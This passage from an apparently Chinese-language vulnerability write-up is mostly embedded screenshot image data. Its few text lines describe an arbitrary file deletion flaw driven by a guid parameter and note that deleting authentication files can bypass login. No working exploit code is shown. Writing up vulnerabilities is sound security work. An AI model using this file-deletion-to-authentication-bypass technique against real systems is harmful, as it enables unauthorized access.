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" alt="img">img</a></h3><p>能将传入的guid传入的文件删除</p>
<h1 id="身份绕过"><a href="#身份绕过" class="headerlink" title="身份绕过"></a>身份绕过</h1><p>删文件某些时候可以删除一些认证的文件，进行文件的绕过</p>
<p><a href="data:image/png;base64,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"><img src="data:image/png;base64,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" alt="img"></a></p>
<p><a href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYYAAABPCAYAAADvEGItAAAMpklEQVR4Ae2cP2scSROH75NspkypwHDgyInAgaNNdNiOFFzoyDjwgZUKgzODdRgFDgyX+PQRDl6wA0VCX6dfpv9Nd03Nn56Z1cyunkBIu9vTXV31TP2qu2f122azMfzgg31g4OTkxHz+/Nm8f/8eZndw3378+NF8//49/nz79s2cnZ3h6x34uuR+e/bsmbm+vo5xqWJU3QfV/VDST0nb30oa0xYBgQEYgIHDZwBhWLga4CY7/JuMGBPjfWMAYUAYdrYc3bebAXtJ4DDgGEAYEAaEAQZgAAYyBhAGgMiAoGKiaoYBGEAYEAaEAQZgAAYyBhAGgMiAoFqkWoQBGEAYEAaEAQZgAAYyBnYvDC9uzPbq3v28u8gGL6pMnlyb06t78/QFal7kN4Afzxy+w3ePlIHdC0N07IV5agXilzl5MiK5IwzcpJGlEfxwLfzAwGAGHlAYqpvZi8PltTkqDRLCMDiorCgQDhiAgSkMzCgMLun3bfUcnf8y26sRqwaEAWEoLSZoDzMwMIqBeYTBJ+3t1Y057gmEJgzH7+7Ntj